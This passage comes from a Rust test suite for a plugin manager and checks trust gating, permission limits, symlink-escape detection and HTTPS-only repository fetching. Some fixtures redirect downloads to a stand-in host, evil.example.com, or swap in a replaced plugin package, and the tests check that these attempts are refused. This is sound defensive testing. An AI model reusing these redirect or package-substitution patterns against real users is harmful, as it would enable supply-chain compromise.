    assert!(crate::pack_plugin_dir(&plugin_dir, Some(&out_zip)).is_err());

    // Vite scaffold generates expected pure-Web TypeScript project layout.
    let vite_dir = tmp.path().join("vite-tool");
    crate::init_plugin_scaffold_vite(&vite_dir, ScaffoldKind::Tool).unwrap();
    assert!(vite_dir.join("package.json").is_file());
    assert!(vite_dir.join("vite.config.ts").is_file());
    assert!(vite_dir.join("tsconfig.json").is_file());
    assert!(vite_dir.join("manifest.toml").is_file());
    assert!(vite_dir.join("index.html").is_file());
    assert!(vite_dir.join("src/index.ts").is_file());
    assert!(vite_dir.join("src/main.ts").is_file());
    assert!(vite_dir.join("src/style.css").is_file());
    let vite_manifest = PluginManifest::from_file(&vite_dir.join("manifest.toml")).unwrap();
    assert_eq!(vite_manifest.ui_entry.as_deref(), Some("ui.html"));
}

#[test]
fn pending_trust_enforced_across_install_link_reload_and_ui_html_load() {
    let data_dir = tempfile::tempdir().unwrap();
    let src = tempfile::tempdir().unwrap();
    let plugin_dir = src.path().join("net-tool");
    std::fs::create_dir_all(&plugin_dir).unwrap();
    std::fs::write(
        plugin_dir.join("manifest.toml"),
        r#"
id = "net-tool"
name = "Net Tool"
version = "0.1.0"
entry = "index.js"
ui_entry = "ui.html"
capabilities = ["tool"]

[permissions]
domains = ["api.example.com"]
workspace_read = false

[[tools]]
id = "ping"
name = "Ping"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_dir.join("index.js"),
        r#"module.exports = { runTool() { return { blocks: [{ type: "text", content: "pong" }] }; } };"#,
    )
    .unwrap();
    std::fs::write(
        plugin_dir.join("ui.html"),
        r#"<!doctype html><html><body><h1>Net Tool</h1></body></html>"#,
    )
    .unwrap();

    let mgr = PluginManager::new(data_dir.path());

    // 1. Built-in plugins are never pending_trust, and report has_network accurately.
    let builtins = mgr.list_plugins().unwrap();
    let cf = builtins
        .iter()
        .find(|p| p.manifest.id == "codeforces")
        .unwrap();
    assert!(!cf.pending_trust);
    assert!(!cf.overrides_builtin);
    assert!(cf.has_network);

    // 2. Installing external plugin with declared domain sets pending_trust = true.
    let installed = mgr.install_from_dir(&plugin_dir).unwrap();
    assert!(installed.pending_trust);
    assert!(installed.has_network);
    assert!(!installed.overrides_builtin);
    assert!(installed.source_repo.is_none());

    // 3. Core refuses load_plugin, load_plugin_ui_html, run_tool, and omits from list_tools.
    assert!(matches!(
        mgr.load_plugin("net-tool"),
        Err(PluginError::Untrusted(_))
    ));
    assert_eq!(
        mgr.load_plugin_ui_html("net-tool").unwrap_err().code(),
        "PLUGIN_UNTRUSTED"
    );
    assert_eq!(
        mgr.run_tool("net-tool", "ping", serde_json::json!({}), None)
            .unwrap_err()
            .code(),
        "PLUGIN_UNTRUSTED"
    );
    assert!(mgr.list_tools().is_empty());

    // 4. trust_plugin clears pending_trust and allows both run_tool and load_plugin_ui_html.
    mgr.trust_plugin("net-tool").unwrap();
    let trusted_list = mgr.list_plugins().unwrap();
    let trusted = trusted_list
        .iter()
        .find(|p| p.manifest.id == "net-tool")
        .unwrap();
    assert!(!trusted.pending_trust);
    let loaded_html = mgr.load_plugin_ui_html("net-tool").unwrap();
    assert_eq!(loaded_html.plugin_id, "net-tool");
    assert!(loaded_html.html.contains("<h1>Net Tool</h1>"));

    let res = mgr
        .run_tool("net-tool", "ping", serde_json::json!({}), None)
        .unwrap();
    assert_eq!(res.blocks.len(), 1);

    // 5. Disabling the plugin causes load_plugin_ui_html to return PLUGIN_DISABLED.
    mgr.set_enabled("net-tool", false).unwrap();
    assert_eq!(
        mgr.load_plugin_ui_html("net-tool").unwrap_err().code(),
        "PLUGIN_DISABLED"
    );
    mgr.set_enabled("net-tool", true).unwrap();

    // 6. Uninstall + link with permission expansion on reload re-triggers pending_trust.
    mgr.uninstall_plugin("net-tool").unwrap();
    let linked = mgr.link_plugin_dir(&plugin_dir).unwrap();
    assert!(linked.pending_trust);
    mgr.trust_plugin("net-tool").unwrap();
    assert!(mgr.load_plugin("net-tool").is_ok());
    assert!(mgr.load_plugin_ui_html("net-tool").is_ok());

    // Edit linked manifest to add a new sensitive permission (workspace_read = true).
    std::fs::write(
        plugin_dir.join("manifest.toml"),
        r#"
id = "net-tool"
name = "Net Tool"
version = "0.1.0"
entry = "index.js"
ui_entry = "ui.html"
capabilities = ["tool"]

[permissions]
domains = ["api.example.com"]
workspace_read = true
"#,
    )
    .unwrap();
    let reloaded = mgr
        .list_plugins()
        .unwrap()
        .into_iter()
        .find(|p| p.manifest.id == "net-tool")
        .unwrap();
    assert!(reloaded.pending_trust);
    assert!(matches!(
        mgr.load_plugin("net-tool"),
        Err(PluginError::Untrusted(_))
    ));
    assert_eq!(
        mgr.load_plugin_ui_html("net-tool").unwrap_err().code(),
        "PLUGIN_UNTRUSTED"
    );
}

#[test]
fn repo_https_enforcement_legacy_migration_restore_and_fetch_errors() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    // 1. Plaintext HTTP rejected for non-loopback hosts with HTTP_NOT_ALLOWED.
    let err = mgr
        .add_repo("http://evil.example.com/index.json", None)
        .unwrap_err();
    assert_eq!(err.code(), "HTTP_NOT_ALLOWED");

    // 2. Loopback HTTP allowed (localhost, 127.0.0.1, [::1]).
    mgr.add_repo("http://localhost:8080/index.json", Some("Local".into()))
        .unwrap();
    mgr.add_repo("http://127.0.0.1:8081/index.json", None)
        .unwrap();
    mgr.add_repo("http://[::1]:8082/index.json", None).unwrap();

    // 3. Remove official repo, then restore_official_repo brings it back at index 0.
    let official = crate::official_repo_url();
    assert!(mgr.remove_repo(&official).unwrap());
    assert!(!mgr.list_repos().unwrap().iter().any(|r| r.url == official));
    assert!(mgr.restore_official_repo().unwrap());
    assert_eq!(mgr.list_repos().unwrap()[0].url, official);
    assert!(!mgr.restore_official_repo().unwrap());

    // 4. Legacy raw.githubusercontent.com URL auto-migrates to official-latest release URL.
    let legacy_json = serde_json::json!({
        "repos": [
            { "url": crate::LEGACY_OFFICIAL_PLUGIN_REPO_URL, "name": "XCPC Official" },
            { "url": "https://broken.example.com/index.json", "name": "Broken Repo" }
        ]
    });
    std::fs::write(
        data_dir.path().join("plugin_repos.json"),
        serde_json::to_vec_pretty(&legacy_json).unwrap(),
    )
    .unwrap();
    let migrated = mgr.list_repos().unwrap();
    assert_eq!(migrated[0].url, official);
    assert_eq!(migrated[1].url, "https://broken.example.com/index.json");

    // 5. fetch_all_repo_catalogs returns per-repo errors without swallowing them.
    let mock_http = MockHttpClient::new(move |req| {
        if req.url == official {
            ok_json(
                r#"{
                    "name": "XCPC Official",
                    "plugins": [{
                        "id": "demo-tool",
                        "name": "Demo Tool",
                        "version": "1.0.0",
                        "description": "Demo",
                        "download_url": "https://example.com/demo-tool-1.0.0.zip",
                        "sha256": "deadbeef",
                        "capabilities": ["tool"],
                        "has_ui": false,
                        "official": true
                    }]
                }"#,
            )
        } else {
            Err(PluginError::Http("connection refused".into()))
        }
    });
    let aggregated = mgr.fetch_all_repo_catalogs(&mock_http).unwrap();
    assert_eq!(aggregated.plugins.len(), 1);
    assert_eq!(aggregated.plugins[0].entry.id, "demo-tool");
    assert_eq!(aggregated.errors.len(), 1);
    assert_eq!(
        aggregated.errors[0].repo_url,
        "https://broken.example.com/index.json"
    );
    assert_eq!(
        aggregated.errors[0].repo_name.as_deref(),
        Some("Broken Repo")
    );
}

#[test]
fn check_validates_ui_html_and_pack_defaults_outside_plugin_dir() {
    let tmp = tempfile::tempdir().unwrap();
    let bad_ui_dir = tmp.path().join("bad-ui");
    std::fs::create_dir_all(&bad_ui_dir).unwrap();
    std::fs::write(
        bad_ui_dir.join("manifest.toml"),
        r#"
id = "bad-ui"
name = "Bad UI"
version = "0.1.0"
entry = "index.js"
ui_entry = "ui.html"
capabilities = ["tool"]
"#,
    )
    .unwrap();
    std::fs::write(
        bad_ui_dir.join("index.js"),
        "module.exports = { runTool() { return { blocks: [] }; } };",
    )
    .unwrap();
    // Empty ui.html must fail check.
    std::fs::write(bad_ui_dir.join("ui.html"), "   \n  ").unwrap();

    let report = crate::check_plugin_dir(&bad_ui_dir);
    assert!(
        !report.ok,
        "check_plugin_dir must fail when ui.html is empty"
    );
    assert!(
        report.issues.iter().any(|i| i.code == "EMPTY_UI_HTML"),
        "expected EMPTY_UI_HTML in issues, got: {:?}",
        report.issues
    );

    // Valid non-empty UTF-8 HTML passes check.
    std::fs::write(bad_ui_dir.join("ui.html"), "<!doctype html><h1>OK</h1>").unwrap();
    let ok_report = crate::check_plugin_dir(&bad_ui_dir);
    assert!(ok_report.ok, "unexpected issues: {:?}", ok_report.issues);
    assert!(ok_report.has_ui);

    // Symlink escape in ui_entry must fail with SYMLINK_ESCAPE.
    #[cfg(unix)]
    {
        let secret = tmp.path().join("outside.html");
        std::fs::write(&secret, "<h1>outside</h1>").unwrap();
        std::fs::remove_file(bad_ui_dir.join("ui.html")).unwrap();
        std::os::unix::fs::symlink(&secret, bad_ui_dir.join("ui.html")).unwrap();
        let esc_report = crate::check_plugin_dir(&bad_ui_dir);
        assert!(!esc_report.ok);
        assert!(
            esc_report.issues.iter().any(|i| i.code == "SYMLINK_ESCAPE"),
            "expected SYMLINK_ESCAPE, got: {:?}",
            esc_report.issues
        );
    }

    // Vite scaffold uses official npm SDK package and title-cased display name.
    let vite_dir = tmp.path().join("cool-graph-tool");
    crate::init_plugin_scaffold_vite(&vite_dir, ScaffoldKind::Tool).unwrap();
    let pkg = std::fs::read_to_string(vite_dir.join("package.json")).unwrap();
    assert!(pkg.contains(&format!(
        "\"{}\": \"{}\"",
        crate::OFFICIAL_PLUGIN_SDK_PACKAGE,
        crate::OFFICIAL_PLUGIN_SDK_VERSION
    )));
    let vite_manifest = PluginManifest::from_file(&vite_dir.join("manifest.toml")).unwrap();
    assert_eq!(vite_manifest.name, "Cool Graph Tool");
    assert_eq!(vite_manifest.ui_entry.as_deref(), Some("ui.html"));

    // pack_plugin_dir default output is in parent directory (outside plugin dir).
    let good_dir = tmp.path().join("pack-me");
    init_plugin_scaffold(&good_dir, ScaffoldKind::Tool).unwrap();
    let packed = crate::pack_plugin_dir(&good_dir, None).unwrap();
    assert!(packed.output_path.is_file());
    assert_eq!(
        std::fs::canonicalize(&packed.output_path).unwrap(),
        std::fs::canonicalize(tmp.path().join("pack-me-0.1.0.zip")).unwrap()
    );
    assert!(!good_dir.join("pack-me-0.1.0.zip").exists());
}

#[test]
fn cross_repo_trust_isolation_resets_pending_trust_on_source_change() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    let make_zip = |version: &str, name: &str| -> (Vec<u8>, String) {
        let mut buf = std::io::Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut buf);
            let opts = zip::write::SimpleFileOptions::default();
            zip.start_file("manifest.toml", opts).unwrap();
            let manifest = format!(
                r#"id = "net-iso"
name = "{name}"
version = "{version}"
entry = "index.js"
capabilities = ["tool"]

[permissions]
domains = ["api.example.com"]
workspace_read = false
"#
            );
            std::io::Write::write_all(&mut zip, manifest.as_bytes()).unwrap();
            zip.start_file("index.js", opts).unwrap();
            std::io::Write::write_all(
                &mut zip,
                b"module.exports = { runTool() { return { blocks: [] }; } };",
            )
            .unwrap();
            zip.finish().unwrap();
        }
        let bytes = buf.into_inner();
        let sha = crate::sha256_hex(&bytes);
        (bytes, sha)
    };

    let (zip_v1, sha_v1) = make_zip("1.0.0", "Net Iso v1");
    let (zip_v2, sha_v2) = make_zip("2.0.0", "Net Iso v2");
    let (zip_evil, sha_evil) = make_zip("3.0.0", "Net Iso (Replaced)");

    let repo_a = "https://repo-a.example.com/index.json";
    let repo_b = "https://repo-b.example.com/index.json";

    let z1 = zip_v1.clone();
    let z2 = zip_v2.clone();
    let ze = zip_evil.clone();
    let http = MockHttpClient::new(|_| Err(PluginError::Http("unused".into()))).with_bytes_handler(
        move |url| match url {
            "https://repo-a.example.com/v1.zip" => Ok(z1.clone()),
            "https://repo-a.example.com/v2.zip" => Ok(z2.clone()),
            "https://repo-b.example.com/v3.zip" => Ok(ze.clone()),
            other => Err(PluginError::Http(format!("unexpected {other}"))),
        },
    );

    let entry_a1 = crate::RepoPluginEntry {
        id: "net-iso".into(),
        name: "Net Iso v1".into(),
        version: "1.0.0".into(),
        description: String::new(),
        download_url: "https://repo-a.example.com/v1.zip".into(),
        sha256: sha_v1,
        capabilities: vec![PluginCapability::Tool],
        has_ui: false,
        official: false,
        permissions: None,
    };

    // 1. Install from repo A -> pending_trust = true, source_repo = Some(repo_a).
    let inst1 = mgr
        .install_from_repo_entry_from_source(repo_a, &entry_a1, &http)
        .unwrap();
    assert!(inst1.pending_trust);
    assert_eq!(inst1.source_repo.as_deref(), Some(repo_a));

    // 2. Trust plugin.
    mgr.trust_plugin("net-iso").unwrap();

    // 3. Same-repo update with same permissions preserves trust.
    let entry_a2 = crate::RepoPluginEntry {
        version: "2.0.0".into(),
        name: "Net Iso v2".into(),
        download_url: "https://repo-a.example.com/v2.zip".into(),
        sha256: sha_v2,
        ..entry_a1.clone()
    };
    let inst2 = mgr
        .install_from_repo_entry_from_source(repo_a, &entry_a2, &http)
        .unwrap();
    assert!(!inst2.pending_trust);
    assert_eq!(inst2.source_repo.as_deref(), Some(repo_a));

    // 4. Different-repo install (repo B) with identical permissions MUST reset pending_trust!
    let entry_b3 = crate::RepoPluginEntry {
        version: "3.0.0".into(),
        name: "Net Iso (Replaced)".into(),
        download_url: "https://repo-b.example.com/v3.zip".into(),
        sha256: sha_evil,
        ..entry_a1.clone()
    };
    let inst3 = mgr
        .install_from_repo_entry_from_source(repo_b, &entry_b3, &http)
        .unwrap();
    assert!(inst3.pending_trust);
    assert_eq!(inst3.source_repo.as_deref(), Some(repo_b));

    // 5. Trust repo B, then install locally (source_repo = None) -> MUST also reset pending_trust!
    mgr.trust_plugin("net-iso").unwrap();
    let inst_local = mgr.install_from_zip_bytes(&zip_v1, None).unwrap();
    assert!(inst_local.pending_trust);
    assert!(inst_local.source_repo.is_none());
}

#[test]
fn ureq_get_bytes_follows_loopback_redirects_and_blocks_http_downgrade() {
    use crate::http::HttpClient as _;
    use std::io::{Read, Write as _};
    use std::net::TcpListener;

    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let base = format!("http://{addr}");
    let target_ok = format!("{base}/payload.bin");

    let handle = std::thread::spawn(move || {
        for _ in 0..3 {
            let Ok((mut stream, _)) = listener.accept() else {
                break;
            };
            let mut buf = [0u8; 2048];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]);
            let first = req.lines().next().unwrap_or("");
            if first.contains("/redirect-ok") {
                let resp = format!(
                    "HTTP/1.1 302 Found\r\nLocation: {target_ok}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                );
                let _ = stream.write_all(resp.as_bytes());
            } else if first.contains("/payload.bin") {
                let body = b"hello-zip";
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    body.len()
                );
                let _ = stream.write_all(resp.as_bytes());
                let _ = stream.write_all(body);
            } else if first.contains("/redirect-downgrade") {
                let resp = "HTTP/1.1 302 Found\r\nLocation: http://evil.example.com/pkg.zip\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                let _ = stream.write_all(resp.as_bytes());
            }
        }
    });

    let client = crate::UreqHttpClient::new();
    let bytes = client.get_bytes(&format!("{base}/redirect-ok")).unwrap();
    assert_eq!(bytes, b"hello-zip");

    let err = client
        .get_bytes(&format!("{base}/redirect-downgrade"))
        .unwrap_err();
    assert_eq!(err.code(), "HTTP_NOT_ALLOWED");

    let _ = handle.join();
}

#[test]
fn fetch_all_repo_catalogs_backfills_missing_or_url_repo_name() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let official = crate::official_repo_url();
    mgr.remove_repo(&official).unwrap();

    let url1 = "https://repo1.example.com/index.json";
    let url2 = "https://repo2.example.com/index.json";
    let url3 = "https://repo3.example.com/index.json";
    mgr.add_repo(url1, None).unwrap();
    mgr.add_repo(url2, Some(url2.to_string())).unwrap();
    mgr.add_repo(url3, Some("User Custom Name".to_string()))
        .unwrap();

    let mock_http = MockHttpClient::new(move |req| match req.url.as_str() {
        u if u == url1 => ok_json(r#"{"name": "Backfilled Repo 1", "plugins": []}"#),
        u if u == url2 => ok_json(r#"{"name": "Backfilled Repo 2", "plugins": []}"#),
        u if u == url3 => ok_json(r#"{"name": "Remote Name 3", "plugins": []}"#),
        other => Err(PluginError::Http(format!("unexpected {other}"))),
    });

    let _ = mgr.fetch_all_repo_catalogs(&mock_http).unwrap();
    let saved = mgr.list_repos().unwrap();
    assert_eq!(saved[0].name.as_deref(), Some("Backfilled Repo 1"));
    assert_eq!(saved[1].name.as_deref(), Some("Backfilled Repo 2"));
    assert_eq!(saved[2].name.as_deref(), Some("User Custom Name"));
}

#[test]
fn fetch_repo_catalog_follows_https_redirects_and_blocks_http_downgrade() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    // 1. HTTPS -> HTTPS 302 redirect (e.g. GitHub Release asset download) succeeds.
    let mock_http = MockHttpClient::new(|req| {
        if req.url == "https://github.com/org/repo/releases/download/latest/index.json" {
            let mut headers = std::collections::BTreeMap::new();
            headers.insert(
                "location".to_string(),
                "https://objects.githubusercontent.com/assets/index.json".to_string(),
            );
            Ok(HttpResponse {
                status: 302,
                headers,
                body: String::new(),
                body_base64: None,
            })
        } else if req.url == "https://objects.githubusercontent.com/assets/index.json" {
            ok_json(r#"{"name": "XCPC Official", "plugins": []}"#)
        } else {
            Err(PluginError::Http(format!("unexpected url {}", req.url)))
        }
    });
    let cat = mgr
        .fetch_repo_catalog(
            "https://github.com/org/repo/releases/download/latest/index.json",
            &mock_http,
        )
        .unwrap();
    assert_eq!(cat.name, "XCPC Official");

    // 2. HTTPS -> plaintext HTTP redirect must be rejected with HTTP_NOT_ALLOWED.
    let downgrade_http = MockHttpClient::new(|_req| {
        let mut headers = std::collections::BTreeMap::new();
        headers.insert(
            "location".to_string(),
            "http://evil.example.com/index.json".to_string(),
        );
        Ok(HttpResponse {
            status: 302,
            headers,
            body: String::new(),
            body_base64: None,
        })
    });
    let err = mgr
        .fetch_repo_catalog("https://github.com/org/repo/index.json", &downgrade_http)
        .unwrap_err();
    assert_eq!(err.code(), "HTTP_NOT_ALLOWED");
}

#[test]
fn http_fetch_base64_response_type() {
    let manifest = minimal_manifest("img-fetcher", &["img.example.com"], false);
    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        assert_eq!(req.response_type, crate::http::HttpResponseType::Base64);
        Ok(HttpResponse {
            status: 200,
            headers: BTreeMap::from([("content-type".to_string(), "image/png".to_string())]),
            body: String::new(),
            body_base64: Some("iVBORw0KGgo=".to_string()),
        })
    }));
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let src = r#"
        module.exports = {
            fetchAvatar() {
                const res = host.http.fetch({
                    url: "https://img.example.com/avatar.png",
                    responseType: "base64",
                });
                return { status: res.status, b64: res.body_base64, ct: res.headers["content-type"] };
            }
        };
    "#;
    let res = PluginRuntime::call_function(src, "fetchAvatar", &[], &host_ctx).unwrap();
    assert_eq!(res.value["status"], 200);
    assert_eq!(res.value["b64"], "iVBORw0KGgo=");
    assert_eq!(res.value["ct"], "image/png");
}

#[test]
fn phase7a_template_plugin_scaffold_check_pack_install_and_mounts() {
    let dir = tempfile::tempdir().unwrap();
    let plugin_src = dir.path().join("icpc-asia-pack");
    crate::init_plugin_scaffold(&plugin_src, crate::ScaffoldKind::Template).unwrap();

    // Pure template plugin does not have index.js and does not trigger pending_trust.
    assert!(!plugin_src.join("index.js").exists());
    assert!(plugin_src.join("templates/sample.typ").is_file());
    assert!(plugin_src.join("assets/badge.svg").is_file());

    let manifest = PluginManifest::from_file(&plugin_src.join("manifest.toml")).unwrap();
    assert!(!manifest.requires_script_entry());
    assert!(!manifest.requires_trust());
    assert_eq!(manifest.templates.len(), 1);
    assert_eq!(manifest.templates[0].id, "sample");

    // `check_plugin_dir` validates Typst compilation, #let render, and #let schema.
    let report = crate::check_plugin_dir(&plugin_src);
    assert!(report.ok, "check failed: {:?}", report.issues);

    // `pack_plugin_dir` bundles manifest, template, and assets into a clean zip.
    let zip_out = dir.path().join("icpc-asia-pack.zip");
    let pack = crate::pack_plugin_dir(&plugin_src, Some(&zip_out)).unwrap();
    assert!(pack.files.iter().any(|f| f == "manifest.toml"));
    assert!(pack.files.iter().any(|f| f == "templates/sample.typ"));
    assert!(pack.files.iter().any(|f| f == "assets/badge.svg"));

    // Install from zip into PluginManager and verify mount discovery (no pending_trust).
    let data_dir = dir.path().join("data");
    let pm = PluginManager::new(&data_dir);
    let installed = pm.install_from_zip(&zip_out).unwrap();
    assert!(!installed.pending_trust);
    assert!(installed.enabled);

    let mounts = pm.list_plugin_template_mounts();
    assert_eq!(mounts.len(), 1);
    assert_eq!(mounts[0].plugin_id, "icpc-asia-pack");
    assert_eq!(mounts[0].templates.len(), 1);
    assert_eq!(mounts[0].templates[0].id, "sample");

    // Disabling the plugin removes it from active mounts.
    pm.set_enabled("icpc-asia-pack", false).unwrap();
    assert!(pm.list_plugin_template_mounts().is_empty());
}

#[test]
fn phase7a_template_plugin_rejects_bad_manifest_and_missing_render() {
    let dir = tempfile::tempdir().unwrap();
    let bad = dir.path().join("bad-tpl");
    std::fs::create_dir_all(bad.join("templates")).unwrap();
    std::fs::write(
        bad.join("manifest.toml"),
        r#"
id = "bad-tpl"
name = "Bad"
version = "0.1.0"
capabilities = ["template"]

[[templates]]
id = "broken"
entry = "templates/broken.typ"
"#,
    )
    .unwrap();
    std::fs::write(bad.join("templates/broken.typ"), "#let x = 1\n").unwrap();

    let report = crate::check_plugin_dir(&bad);
    assert!(!report.ok);
    assert!(
        report
            .issues
            .iter()
            .any(|i| i.code == "TEMPLATE_COMPILE_ERROR")
    );
}

#[test]
fn phase7b_workspace_read_write_permissions_and_guardrails() {
    let dir = tempfile::tempdir().unwrap();
    let ws = xcpc_storage::init_workspace(dir.path()).unwrap();
    ws.create_problem("alpha", "Alpha Problem").unwrap();
    // Inject an unknown custom TOML field to verify `updateProblem` preserves it.
    let toml_path = dir.path().join("problems/alpha/problem.toml");
    let orig_toml = std::fs::read_to_string(&toml_path).unwrap();
    std::fs::write(
        &toml_path,
        format!("{orig_toml}\ncustom_note = \"keep-me\"\n"),
    )
    .unwrap();
    ws.write(
        "contests/c1/contest.toml",
        b"name = \"Contest One\"\n[[problem]]\nlabel = \"A\"\nid = \"alpha\"\n",
    )
    .unwrap();
    ws.create_snippet(
        "dsu",
        &xcpc_domain::SnippetMeta {
            title: "Disjoint Set Union".into(),
            tags: vec!["ds".into()],
            ..Default::default()
        },
        Some("struct DSU {};\n"),
        Some("Path compression."),
    )
    .unwrap();
    ws.write(
        "trds/main-trd/trd.toml",
        b"name = \"Team Reference\"\n[[section]]\ntitle = \"DS\"\nsnippets = [\"dsu\"]\n",
    )
    .unwrap();

    let bridge = Arc::new(crate::StorageWorkspaceBridge::new(ws.clone()));

    let mut manifest = minimal_manifest("ws-rw", &[], true);
    manifest.permissions.workspace_write = true;
    let ctx_rw = HostContext {
        manifest: manifest.clone(),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(Arc::clone(&bridge) as Arc<dyn WorkspaceReader>),
        workspace_writer: Some(Arc::clone(&bridge) as Arc<dyn crate::WorkspaceWriter>),
        limits: SandboxLimits::default(),
    };

    let src = r###"
        module.exports = {
            readAll() {
                const problems = host.workspace.listProblems();
                const prob = host.workspace.getProblem("alpha");
                const contests = host.workspace.listContests();
                const contest = host.workspace.getContest("c1");
                const snippets = host.workspace.listSnippets();
                const snippet = host.workspace.getSnippet("dsu");
                const trds = host.workspace.listTrds();
                const trd = host.workspace.getTrd("main-trd");
                return {
                    problems,
                    prob,
                    contests,
                    contest,
                    snippets,
                    snippet,
                    trds,
                    trd,
                    hasDeleteProblem: typeof host.workspace.deleteProblem !== "undefined",
                    hasDeleteSnippet: typeof host.workspace.deleteSnippet !== "undefined",
                    hasUnfreeze: typeof host.workspace.unfreezeContest !== "undefined",
                };
            },
            writeFlow() {
                const created = host.workspace.createProblem({
                    id: "beta",
                    title: "Beta Sum",
                    tags: ["math", "dp"],
                    rating: 1600,
                    timeLimit: "2s",
                    memoryLimit: "512 MiB",
                    statementMd: "## 题目描述\n\nCompute $a + b$.\n",
                    editorialMd: "Add them.\n",
                    samples: [{ input: "1 2\n", output: "3\n" }],
                });
                const updated = host.workspace.updateProblem("alpha", {
                    title: "Alpha Renamed",
                    tags: ["graph"],
                    rating: 1900,
                    timeLimit: "1.5s",
                });
                const sampleRes = host.workspace.setSamples("beta", [
                    { input: "1 2\n", output: "3\n" },
                    { input: "10 20\n", output: "30\n" },
                ]);
                const snipCreated = host.workspace.upsertSnippet({
                    id: "seg-tree",
                    title: "Segment Tree",
                    tags: ["ds", "tree"],
                    code: "struct SegTree {};\n",
                    timeComplexity: "O(log n)",
                    description: "Point update range query",
                    notesMd: "Iterative variant.",
                });
                const snipUpdated = host.workspace.upsertSnippet({
                    id: "seg-tree",
                    title: "Segment Tree v2",
                    code: "struct SegTreeV2 {};\n",
                });
                return { created, updated, sampleRes, snipCreated, snipUpdated };
            },
            createDup() {
                return host.workspace.createProblem({ id: "beta", title: "Dup" });
            },
            tooManySamples() {
                const arr = [];
                for (let i = 0; i < 65; i++) arr.push({ input: "1\n", output: "1\n" });
                return host.workspace.setSamples("beta", arr);
            }
        };
    "###;

    // 1. All 8 read methods succeed, and no raw host paths or forbidden methods are exposed.
    let read_res = PluginRuntime::call_function(src, "readAll", &[], &ctx_rw).unwrap();
    let read_str = serde_json::to_string(&read_res.value).unwrap();
    assert!(
        !read_str.contains(&dir.path().display().to_string()),
        "must not leak host workspace path: {read_str}"
    );
    assert_eq!(read_res.value["problems"].as_array().unwrap().len(), 1);
    assert_eq!(read_res.value["prob"]["id"], "alpha");
    assert_eq!(read_res.value["contests"][0]["id"], "c1");
    assert_eq!(read_res.value["contest"]["problems"][0]["id"], "alpha");
    assert_eq!(read_res.value["snippets"][0]["id"], "dsu");
    assert_eq!(read_res.value["snippet"]["code"], "struct DSU {};\n");
    assert_eq!(read_res.value["trds"][0]["id"], "main-trd");
    assert_eq!(read_res.value["trd"]["title"], "Team Reference");
    assert_eq!(read_res.value["hasDeleteProblem"], false);
    assert_eq!(read_res.value["hasDeleteSnippet"], false);
    assert_eq!(read_res.value["hasUnfreeze"], false);

    // 2. All 4 write methods succeed and preserve unknown TOML fields.
    let write_res = PluginRuntime::call_function(src, "writeFlow", &[], &ctx_rw).unwrap();
    assert_eq!(write_res.value["created"]["id"], "beta");
    assert_eq!(write_res.value["created"]["rating"], 1600);
    assert_eq!(write_res.value["updated"]["title"], "Alpha Renamed");
    assert_eq!(write_res.value["sampleRes"]["count"], 2);
    assert_eq!(write_res.value["snipCreated"]["id"], "seg-tree");
    assert_eq!(write_res.value["snipUpdated"]["title"], "Segment Tree v2");
    let preserved_toml = std::fs::read_to_string(&toml_path).unwrap();
    assert!(
        preserved_toml.contains("custom_note = \"keep-me\""),
        "unknown TOML field must be preserved: {preserved_toml}"
    );

    // 3. Duplicate createProblem fails with ALREADY_EXISTS.
    let dup_err = PluginRuntime::call_function(src, "createDup", &[], &ctx_rw).unwrap_err();
    assert_eq!(dup_err.code(), "ALREADY_EXISTS");

    // 4. >64 samples rejected with INVALID_ARGUMENT.
    let samples_err =
        PluginRuntime::call_function(src, "tooManySamples", &[], &ctx_rw).unwrap_err();
    assert_eq!(samples_err.code(), "INVALID_ARGUMENT");

    // 5. Missing workspace_write permission fails with PERMISSION_DENIED.
    let ctx_ro_perm = HostContext {
        manifest: minimal_manifest("ws-ro-only", &[], true),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(Arc::clone(&bridge) as Arc<dyn WorkspaceReader>),
        workspace_writer: Some(Arc::clone(&bridge) as Arc<dyn crate::WorkspaceWriter>),
        limits: SandboxLimits::default(),
    };
    let perm_err = PluginRuntime::call_function(src, "writeFlow", &[], &ctx_ro_perm).unwrap_err();
    assert_eq!(perm_err.code(), "PERMISSION_DENIED");

    // 6. Read-only workspace rejects writes with WORKSPACE_READ_ONLY.
    let ws_ro = xcpc_storage::Workspace::open(dir.path(), true).unwrap();
    let ro_bridge = Arc::new(crate::StorageWorkspaceBridge::new(ws_ro));
    let ctx_ro_ws = HostContext {
        manifest: manifest.clone(),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(Arc::clone(&ro_bridge) as Arc<dyn WorkspaceReader>),
        workspace_writer: Some(Arc::clone(&ro_bridge) as Arc<dyn crate::WorkspaceWriter>),
        limits: SandboxLimits::default(),
    };
    let ro_err = PluginRuntime::call_function(src, "createDup", &[], &ctx_ro_ws).unwrap_err();
    assert_eq!(ro_err.code(), "WORKSPACE_READ_ONLY");

    // 7. Trust escalation: adding workspace_write after trusting workspace_read resets pending_trust.
    let data_dir = dir.path().join("data");
    let plugin_src = dir.path().join("esc-plugin");
